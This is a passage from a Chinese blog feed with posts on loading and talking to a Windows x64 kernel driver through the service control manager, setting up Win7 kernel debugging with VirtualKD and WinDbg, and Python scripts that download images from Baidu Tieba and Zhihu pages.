<p>已经有前辈巨巨将这些封装到一个类中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div></pre></td><td class="code"><pre><div class="line">/*============================</div><div class="line">Drvier Control Class (SCM way)</div><div class="line">============================*/</div><div class="line"></div><div class="line">#pragma comment(lib,&quot;advapi32.lib&quot;)</div><div class="line"></div><div class="line">class cDrvCtrl</div><div class="line">&#123;</div><div class="line">public:</div><div class="line">    cDrvCtrl()</div><div class="line">    &#123;</div><div class="line">        m_pSysPath = NULL;</div><div class="line">        m_pServiceName = NULL;</div><div class="line">        m_pDisplayName = NULL;</div><div class="line">        m_hSCManager = NULL;</div><div class="line">        m_hService = NULL;</div><div class="line">        m_hDriver = INVALID_HANDLE_VALUE;</div><div class="line">    &#125;</div><div class="line">    ~cDrvCtrl()</div><div class="line">    &#123;</div><div class="line">        CloseServiceHandle(m_hService);</div><div class="line">        CloseServiceHandle(m_hSCManager);</div><div class="line">        CloseHandle(m_hDriver);</div><div class="line">    &#125;</div><div class="line">public:</div><div class="line">    DWORD m_dwLastError;</div><div class="line">    PCHAR m_pSysPath;</div><div class="line">    PCHAR m_pServiceName;</div><div class="line">    PCHAR m_pDisplayName;</div><div class="line">    HANDLE m_hDriver;</div><div class="line">    SC_HANDLE m_hSCManager;</div><div class="line">    SC_HANDLE m_hService;</div><div class="line">public:</div><div class="line">    BOOL Install(PCHAR pSysPath,PCHAR pServiceName,PCHAR pDisplayName);</div><div class="line">    BOOL Start();</div><div class="line">    BOOL Stop();</div><div class="line">    BOOL Remove();</div><div class="line">    BOOL Open(PCHAR pLinkName);</div><div class="line">    BOOL IoControl(DWORD dwIoCode, PVOID InBuff, DWORD InBuffLen, PVOID OutBuff, DWORD OutBuffLen, DWORD *RealRetBytes);</div><div class="line">private:</div><div class="line">    BOOL GetSvcHandle(PCHAR pServiceName);</div><div class="line">    DWORD CTL_CODE_GEN(DWORD lngFunction);</div><div class="line">protected:</div><div class="line">    //null</div><div class="line">&#125;;</div><div class="line"></div><div class="line">BOOL cDrvCtrl::GetSvcHandle(PCHAR pServiceName)</div><div class="line">&#123;</div><div class="line">    m_pServiceName = pServiceName;</div><div class="line">    m_hSCManager = OpenSCManagerA(NULL,NULL,SC_MANAGER_ALL_ACCESS);</div><div class="line">    if (NULL == m_hSCManager)</div><div class="line">    &#123;</div><div class="line">        m_dwLastError = GetLastError();</div><div class="line">        return FALSE;</div><div class="line">    &#125;</div><div class="line">    m_hService = OpenServiceA(m_hSCManager,m_pServiceName,SERVICE_ALL_ACCESS);</div><div class="line">    if (NULL == m_hService)</div><div class="line">    &#123;</div><div class="line">        CloseServiceHandle(m_hSCManager);</div><div class="line">        return FALSE;</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">        return TRUE;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">BOOL cDrvCtrl::Install(PCHAR pSysPath,PCHAR pServiceName,PCHAR pDisplayName)</div><div class="line">&#123;</div><div class="line">    m_pSysPath = pSysPath;</div><div class="line">    m_pServiceName = pServiceName;</div><div class="line">    m_pDisplayName = pDisplayName;</div><div class="line">    m_hSCManager = OpenSCManagerA(NULL,NULL,SC_MANAGER_ALL_ACCESS);</div><div class="line">    if (NULL == m_hSCManager)</div><div class="line">    &#123;</div><div class="line">        m_dwLastError = GetLastError();</div><div class="line">        return FALSE;</div><div class="line">    &#125;</div><div class="line">    m_hService = CreateServiceA(m_hSCManager,m_pServiceName,m_pDisplayName,</div><div class="line">                                SERVICE_ALL_ACCESS,SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START,SERVICE_ERROR_NORMAL,</div><div class="line">                                m_pSysPath,NULL,NULL,NULL,NULL,NULL);</div><div class="line">    if (NULL == m_hService)</div><div class="line">    &#123;</div><div class="line">        m_dwLastError = GetLastError();</div><div class="line">        if (ERROR_SERVICE_EXISTS == m_dwLastError)</div><div class="line">        &#123;</div><div class="line">            m_hService = OpenServiceA(m_hSCManager,m_pServiceName,SERVICE_ALL_ACCESS);</div><div class="line">            if (NULL == m_hService)</div><div class="line">            &#123;</div><div class="line">                CloseServiceHandle(m_hSCManager);</div><div class="line">                return FALSE;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        else</div><div class="line">        &#123;</div><div class="line">            CloseServiceHandle(m_hSCManager);</div><div class="line">            return FALSE;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    return TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line">BOOL cDrvCtrl::Start()</div><div class="line">&#123;</div><div class="line">    if (!StartServiceA(m_hService,NULL,NULL))</div><div class="line">    &#123;</div><div class="line">        m_dwLastError = GetLastError();</div><div class="line">        return FALSE;</div><div class="line">    &#125;</div><div class="line">    return TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line">BOOL cDrvCtrl::Stop()</div><div class="line">&#123;</div><div class="line">    SERVICE_STATUS ss;</div><div class="line">    GetSvcHandle(m_pServiceName);</div><div class="line">    if (!ControlService(m_hService,SERVICE_CONTROL_STOP,&amp;ss))</div><div class="line">    &#123;</div><div class="line">        m_dwLastError = GetLastError();</div><div class="line">        return FALSE;</div><div class="line">    &#125;</div><div class="line">    return TRUE;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">BOOL cDrvCtrl::Remove()</div><div class="line">&#123;</div><div class="line">    GetSvcHandle(m_pServiceName);</div><div class="line">    if (!DeleteService(m_hService))</div><div class="line">    &#123;</div><div class="line">        m_dwLastError = GetLastError();</div><div class="line">        return FALSE;</div><div class="line">    &#125;</div><div class="line">    return TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line">BOOL cDrvCtrl::Open(PCHAR pLinkName)//example: \\\\.\\xxoo</div><div class="line">&#123;</div><div class="line">    if (m_hDriver != INVALID_HANDLE_VALUE)</div><div class="line">        return TRUE;</div><div class="line">    m_hDriver = CreateFileA(pLinkName, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);</div><div class="line">    if(m_hDriver != INVALID_HANDLE_VALUE)</div><div class="line">        return TRUE;</div><div class="line">    else</div><div class="line">        return FALSE;</div><div class="line">&#125;</div><div class="line"></div><div class="line">BOOL cDrvCtrl::IoControl(DWORD dwIoCode, PVOID InBuff, DWORD InBuffLen, PVOID OutBuff, DWORD OutBuffLen, DWORD *RealRetBytes)</div><div class="line">&#123;</div><div class="line">    DWORD dw;</div><div class="line">    BOOL b=DeviceIoControl(m_hDriver,CTL_CODE_GEN(dwIoCode),InBuff,InBuffLen,OutBuff,OutBuffLen,&amp;dw,NULL);</div><div class="line">    if(RealRetBytes)</div><div class="line">        *RealRetBytes=dw;</div><div class="line">    return b;</div><div class="line">&#125;</div><div class="line"></div><div class="line">DWORD cDrvCtrl::CTL_CODE_GEN(DWORD lngFunction)</div><div class="line">&#123;</div><div class="line">    return (FILE_DEVICE_UNKNOWN * 65536) | (FILE_ANY_ACCESS * 16384) | (lngFunction * 4) | METHOD_BUFFERED;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>我们可以直接使用这个类编写一段测试代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;windows.h&gt;</div><div class="line">#include &quot;ScmDrvCtrl.h&quot;</div><div class="line"></div><div class="line">#define IOCTL_IO_TEST 0x800</div><div class="line">#define IOCTL_IO_SAY_HELLO 0x801</div><div class="line"></div><div class="line"></div><div class="line">void main()</div><div class="line">&#123;</div><div class="line">    //得到当前目录下的驱动的全路径</div><div class="line">    char szSysFile[MAX_PATH] = &#123;0&#125;;</div><div class="line">    GetModuleFileNameA(0, szSysFile, MAX_PATH);</div><div class="line">    //加上反斜杠</div><div class="line">    for(SIZE_T i=strlen(szSysFile)-1;i&gt;=0;i--)</div><div class="line">    &#123;</div><div class="line">        if(szSysFile[i]==&apos;\\&apos;)</div><div class="line">        &#123;</div><div class="line">            szSysFile[i+1]=&apos;\0&apos;;</div><div class="line">            break;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    strcat(szSysFile, &quot;KrnlHW64.sys&quot;);</div><div class="line">    char *szSvcLinkName =  &quot;KrnlHW64&quot;;</div><div class="line">    cDrvCtrl cd; </div><div class="line">    if (FALSE == cd.Install(szSysFile, szSvcLinkName, szSvcLinkName))</div><div class="line">    &#123;</div><div class="line">        printf (&quot;[ERROR] Create Service failed\n&quot;);</div><div class="line">        return;</div><div class="line">    &#125;</div><div class="line">    if (FALSE == cd.Start())</div><div class="line">    &#123;</div><div class="line">        printf(&quot;[ERROR] Start Service failed\n&quot;);</div><div class="line">        return;</div><div class="line">    &#125;</div><div class="line">    //测试与驱动通信</div><div class="line">    if (FALSE == cd.Open(&quot;\\\\.\\KrnlHW64&quot;))</div><div class="line">    &#123;</div><div class="line">        printf(&quot;[ERROR]createfile about sys failed\n&quot;);</div><div class="line">        return;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    //传入控制码</div><div class="line">    DWORD InBuffer =100, OutBuffer = 0, RetBytes = 0;</div><div class="line">    cd.IoControl(IOCTL_IO_TEST, &amp;InBuffer, sizeof(InBuffer), &amp;OutBuffer, sizeof(OutBuffer), &amp;RetBytes);</div><div class="line">    printf(&quot;IN: %ld\nout: %ld\nReturnBytesLength: %ld\n&quot;, InBuffer, OutBuffer, RetBytes);</div><div class="line">    cd.IoControl(IOCTL_IO_SAY_HELLO, 0, 0, 0, 0, 0);</div><div class="line">    CloseHandle(cd.m_hDriver);</div><div class="line">    if (FALSE == cd.Stop())</div><div class="line">    &#123;</div><div class="line">        printf(&quot;[ERROR] services stop failed\n&quot;);</div><div class="line">        return;</div><div class="line">    &#125;   </div><div class="line">    cd.Remove();</div><div class="line"></div><div class="line">    getchar();</div><div class="line">    return;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在编译程序的程序为了兼容，最好将其编译成x64位的<br><img src="http://ww1.sinaimg.cn/large/dcfd67b5gw1f0e43ep5bij20jn09awfu.jpg" alt=""><br>编译后拖进虚拟机后运行，运行成功：<br><img src="http://ww4.sinaimg.cn/large/dcfd67b5gw1f0e43lbh4cj20mz0a5myg.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这篇文章接着上面一篇，主要讲述如何x64与x86编程的不同以及如何通过编程自加载所编写的驱动。&lt;/p&gt;
    
    </summary>
    
      <category term="系统安全" scheme="http://venidic.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="驱动" scheme="http://venidic.com/tags/%E9%A9%B1%E5%8A%A8/"/>
    
  </entry>
  
  <entry>
    <title>win7 x64内核安全（1）-环境搭建</title>
    <link href="http://venidic.com/2016/01/22/x64%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8%EF%BC%881%EF%BC%89-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>http://venidic.com/2016/01/22/x64内核安全（1）-环境搭建/</id>
    <published>2016-01-22T02:52:00.000Z</published>
    <updated>2016-01-25T16:03:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>寒假开始啦，本来想回到家浪的飞起的，但是无奈这天气每天把手从被子里面拿出去都是一种勇气，索性还是在家好好玩玩电脑算了。想到明年就要去工作啦，还有好多想做的事想看的书想写的代码都还没开始做，不禁一阵阵羞愧。哎，还是赶紧先把之前看过的内核部分趁着寒假做个总结吧哈哈。<br><a id="more"></a></p>
<p>#win7 x64双机调试</p>
<ol>
<li>安装win7 x64系统到vm中</li>
<li>在虚拟机中关闭UAC，免得老弹个框框烦死了都</li>
<li>拍摄系统快照或者克隆系统（防止你以后将系统搞崩了之后可以还原）</li>
<li>下载virtualKD，自动设置双机调试（xp中是修改配置文件）<a href="http://virtualkd.sysprogs.org/" title="下载地址" target="_blank" rel="external">下载地址</a></li>
<li>将virtualKD target拖进虚拟机中（请在虚拟机中安装vmtools）</li>
<li>在虚拟机中运行target中的vminstall.exe，选择install<br><img src="http://ww2.sinaimg.cn/large/dcfd67b5gw1f0bpsv5mqjj20ga07jjsr.jpg" alt=""></li>
<li>在本机中运行VMMON64.exe，将debugger path设置为我们安装windbg的路径，然后<br>点击run debugger</li>
</ol>
<p><img src="http://ww2.sinaimg.cn/large/dcfd67b5gw1f0bptgxymjj20o40fsn02.jpg" alt=""><br><img src="http://ww2.sinaimg.cn/large/dcfd67b5gw1f0bptrzsjaj20nv0g0juc.jpg" alt=""></p>
<ol>
<li>我们在windbg中设置符号表路径<br><img src="http://ww4.sinaimg.cn/large/dcfd67b5gw1f0bpud5nw8j20fe05mt90.jpg" alt=""></li>
<li>重启虚拟机后就看到win7 自动断下来了，.reload一下，就能加载最新的符号表啦<br><img src="http://ww4.sinaimg.cn/large/dcfd67b5gw1f0bpupi9vwj20u00fh0zf.jpg" alt=""></li>
</ol>
<p>截止到这里，双机调试的环境已经配置好啦。</p>
<p>#win7 x64本机调试</p>
<ol>
<li>cmd下输入<code>bcdedit -debug on</code></li>
<li>重启电脑后打开windbg，选择file-kernel debug，点击local<img src="http://ww2.sinaimg.cn/large/dcfd67b5gw1f0bpv39la1j20bd07i3yq.jpg" alt=""></li>
<li>设置符号表同上</li>
</ol>
<p>#测试驱动加载<br>这里我们主要测试能不能在win7下正常加载驱动，并与应用层进行通信，所以这里关于代码部分无需过多深究。<br>用到的工具如下：</p>
<ul>
<li>dbgview：查看程序调试输入</li>
<li>KmdMgr：驱动加载</li>
<li>pchunter：查看内核及驱动（他的前身在xp下是xuert，在win64平台下还可以用WIN64AST代替）</li>
</ul>
<p>在winddk下编译代码：<br><img src="http://ww4.sinaimg.cn/large/dcfd67b5gw1f0bpwlrbctj207e060q3z.jpg" alt=""><br>这里如果要编译多个c，所以对应的source文件应当这样写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">TARGETNAME=helloddk</div><div class="line">TARGETTYPE=DRIVER</div><div class="line">TARGETPATH=obj</div><div class="line"></div><div class="line">INCLUDES=.\</div><div class="line"></div><div class="line">SOURCES = 1.c    \</div><div class="line">        2.c</div></pre></td></tr></table></figure></p>
<p>makefile还是过去的makefile<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#</div><div class="line"># DO NOT EDIT THIS FILE!!!  Edit .\sources. if you want to add a new source</div><div class="line"># file to this component.  This file merely indirects to the real make file</div><div class="line"># that is shared by all the components of NT OS/2</div><div class="line">#</div><div class="line">!INCLUDE $(NTMAKEENV)\makefile.def</div></pre></td></tr></table></figure></p>
<p>我们build一下：<br><img src="http://ww3.sinaimg.cn/large/dcfd67b5gw1f0bpr6vipoj20gu09kdho.jpg" alt=""><br>编译成功后，我们打开虚拟机，使用kmdMgr加载驱动，同时打开dbgview查看是否有相应消息打出<br><img src="http://ww3.sinaimg.cn/large/dcfd67b5gw1f0bpx4qpevj20lf0a5407.jpg" alt=""></p>
<p>我们打开pchunter，查看驱动是否已加载成功<br><img src="http://ww1.sinaimg.cn/large/dcfd67b5gw1f0bpxfclfcj20ll02j76i.jpg" alt=""></p>
<p>我们尝试IOCTL与驱动层进行通信<br><img src="http://ww1.sinaimg.cn/large/dcfd67b5gw1f0bpxp7hr5j20m0067417.jpg" alt=""><br>最后正常卸载</p>
<p><em>未完待续…</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;寒假开始啦，本来想回到家浪的飞起的，但是无奈这天气每天把手从被子里面拿出去都是一种勇气，索性还是在家好好玩玩电脑算了。想到明年就要去工作啦，还有好多想做的事想看的书想写的代码都还没开始做，不禁一阵阵羞愧。哎，还是赶紧先把之前看过的内核部分趁着寒假做个总结吧哈哈。&lt;br&gt;
    
    </summary>
    
      <category term="系统安全" scheme="http://venidic.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="驱动" scheme="http://venidic.com/tags/%E9%A9%B1%E5%8A%A8/"/>
    
  </entry>
  
  <entry>
    <title>[持续更新]python爬取图片</title>
    <link href="http://venidic.com/2016/01/07/%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0-python%E7%88%AC%E5%8F%96%E5%9B%BE%E7%89%87/"/>
    <id>http://venidic.com/2016/01/07/持续更新-python爬取图片/</id>
    <published>2016-01-07T01:05:17.000Z</published>
    <updated>2016-01-25T06:04:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>文章写在一段时间之前，这几天考完科目三之后没事会陆续更新到自己的博客上，反正自己很懒，没事的时候就将自己做过的一些笔记扔到博客上，一来是为了回顾，二来是为了总结。<br>关于这篇文章的起因是因为之前的那篇python一日一练的第13题，爬取一个妹子的图片，后来便对python爬取图片有了兴趣（<del>其实我只是为了爬取妹子的皂片呢</del>），这篇文章讲持续更新关于利用python爬取妹子皂片的代码，敬请关注：<br><a id="more"></a></p>
<p>#百度贴吧<br>最先选择这个作为爬虫的练手，是因为这个很简单，没有太多的反爬限制。咳咳，当然也是因为前段时间看到了一个妹子，最开始感觉惊为天人。于是准备最先写关于贴吧的图片爬虫：<br>关于爬取贴吧上的皂片，比较简单，弄清楚 页数即可。<br><img src="http://ww2.sinaimg.cn/large/dcfd67b5gw1f0571ntv2oj20gs07z0vd.jpg" alt=""><br>打开贴吧，一键F12后搜索下一页，知道了位置后解析获得页数（页数 = 总贴数目/每一页数目）。解析每一个帖子里面有多少楼同理。这里比较简单，直接贴出代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line">__author__ = &apos;venidic&apos;</div><div class="line">import os</div><div class="line">import urllib</div><div class="line">from bs4 import BeautifulSoup</div><div class="line">from urlparse import urlsplit</div><div class="line"></div><div class="line">TIEBA = &apos;http://tieba.baidu.com&apos;</div><div class="line"></div><div class="line">def DownloadPic(url):</div><div class="line">    image_content = urllib.urlopen(url).read()</div><div class="line">    filename = os.path.basename(urlsplit(url)[2])</div><div class="line">    pout = open(r&apos;photo/&apos;+filename, &apos;wb&apos;)</div><div class="line">    pout.write(image_content)</div><div class="line">    pout.close()</div><div class="line"></div><div class="line"></div><div class="line">def FindPic(url):</div><div class="line">    content = urllib.urlopen(url)</div><div class="line">    soup = BeautifulSoup(content, &apos;html.parser&apos;)</div><div class="line">    for img in soup.find_all(&apos;img&apos;, &#123;&apos;class&apos;: &apos;BDE_Image&apos;&#125;):</div><div class="line">        DownloadPic(img[&apos;src&apos;])</div><div class="line"></div><div class="line"></div><div class="line">def FindPosts(url):</div><div class="line">    print &apos;this is a cute spider.......\n.&apos;</div><div class="line">    content = urllib.urlopen(url)</div><div class="line">    soup = BeautifulSoup(content, &apos;html.parser&apos;)</div><div class="line">    for link in soup.find_all(&apos;a&apos;, &#123;&apos;class&apos;: &apos;j_th_tit&apos;&#125;):</div><div class="line">        inlink = TIEBA + link[&apos;href&apos;]</div><div class="line">        FindPic(inlink)</div><div class="line"></div><div class="line">def FindPages(soup, url):</div><div class="line">    for page in soup.find_all(&apos;a&apos;, &#123;&apos;class&apos;: &apos;last&apos;&#125;):</div><div class="line">        page_last = page.get(&apos;href&apos;)</div><div class="line">        page_number = int(page_last[page_last.find(&apos;pn=&apos;)+3:]) / 50</div><div class="line">        page_query = page_last[:page_last.find(&apos;pn=&apos;)]</div><div class="line">        print (&apos;page_number_all: %d\npage_query: %s&apos;%(page_number, page_query))</div><div class="line">    return page_number, page_query</div><div class="line"></div><div class="line"></div><div class="line">def BeginSpider(url):</div><div class="line">    if False == os.path.isdir(&apos;photo&apos;):</div><div class="line">        os.mkdir(&apos;photo&apos;)</div><div class="line">    content = urllib.urlopen(url)</div><div class="line">    soup = BeautifulSoup(content, &apos;html.parser&apos;)</div><div class="line">    page_all, page_query = FindPages(soup, url)</div><div class="line">    page_count = 3</div><div class="line">    #FindPosts(url)</div><div class="line">    while page_count &lt; 10:</div><div class="line">        url_query = TIEBA + page_query + &apos;pn=&apos;+str(page_count*50)</div><div class="line">        print (&quot;current page number: %d\ncurrent page url: %s&quot; % (page_count, url_query))</div><div class="line">        FindPosts(url_query)</div><div class="line">        page_count += 1</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    BeginSpider(&apos;http://tieba.baidu.com/f?kw=yurisa&amp;fr=ala0&amp;loc=rec&apos;)</div></pre></td></tr></table></figure></p>
<p><em>上述代码单线程，只针对贴吧，自动获取页数，可以自己修改要爬取的页数，并没针对是否楼主进行判断</em><br>下面是运行结果：<br><img src="http://ww3.sinaimg.cn/large/dcfd67b5gw1f0572cqzs9j20ry0dvaer.jpg" alt=""><br>爬取了10页，效果还可以</p>
<p>#知乎<br>哈，知乎上可谓是跟着轮子哥每日阅妹无数啊，而且我乎上爆照的妹子质量真心不错啊，于是爬虫还是要写的，所有的萌妹纸都得存到硬！盘！里！<br>在爬知乎上皂片的时候，F12后发现其实知乎上所有的照片<br><img src="http://ww3.sinaimg.cn/large/dcfd67b5gw1f0572qj54aj20ld04zdh3.jpg" alt=""><br>于是爬虫很简单的就写出来了，但是在爬取的过程中，首先可以将不是链接的照片去掉。<br>然后在爬取的过程中发现了知乎的同一张照片有两个版本，一个是大图一个是预览图，这里需要区分一下，当然是要高清无码的咯。还有就是，在爬取的时候很容易将用户的头像给爬下来。分析了下用户的头像，其实用户的头像的分辨率恒为25*25，这里可以通过分辨率来去除，但是为了方便，可以直接在html解析中通过tag来获得自己想要的img：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">__author__ = &apos;venidic&apos;</div><div class="line">import os</div><div class="line">import urllib</div><div class="line">from bs4 import BeautifulSoup</div><div class="line">from urlparse import urlsplit</div><div class="line"></div><div class="line">def DownloadPic(url):</div><div class="line">    image_content = urllib.urlopen(url).read()</div><div class="line">    filename = os.path.basename(urlsplit(url)[2])</div><div class="line">    pout = open(r&apos;photo_zhihu/&apos;+filename, &apos;wb&apos;)</div><div class="line">    pout.write(image_content)</div><div class="line">    pout.close()</div><div class="line"></div><div class="line">def BeginSpider(url):</div><div class="line">    if False == os.path.isdir(&apos;photo_zhihu&apos;):</div><div class="line">        os.mkdir(&apos;photo_zhihu&apos;)</div><div class="line">    content = urllib.urlopen(url)</div><div class="line">    soup = BeautifulSoup(content, &apos;html.parser&apos;)</div><div class="line">    #class=&quot;origin_image inline-img zh-lightbox-thumb&quot;</div><div class="line">  img_old = &apos;&apos;</div><div class="line">  for img in soup.select(&apos;img[data-original]&apos;):</div><div class="line">        img_new = img[&apos;data-original&apos;]</div><div class="line">        if img_new != img_old:</div><div class="line">            print img[&apos;data-original&apos;]</div><div class="line">            DownloadPic(img_new)</div><div class="line">        img_old = img_new</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    BeginSpider(&apos;https://www.zhihu.com/question/28202126&apos;)</div><div class="line"></div><div class="line">#### &lt;/pre&gt;</div></pre></td></tr></table></figure></p>
<p>运行效果<br><img src="http://ww3.sinaimg.cn/large/dcfd67b5gw1f05739f5qvj20oi0eon4d.jpg" alt=""><br><img src="http://ww2.sinaimg.cn/large/dcfd67b5gw1f0573poh6aj20wv0ftaih.jpg" alt=""><br><em>注明：只针对知乎单一主页爬取有效，之后有时间会陆续更新关于知乎的爬虫</em></p>
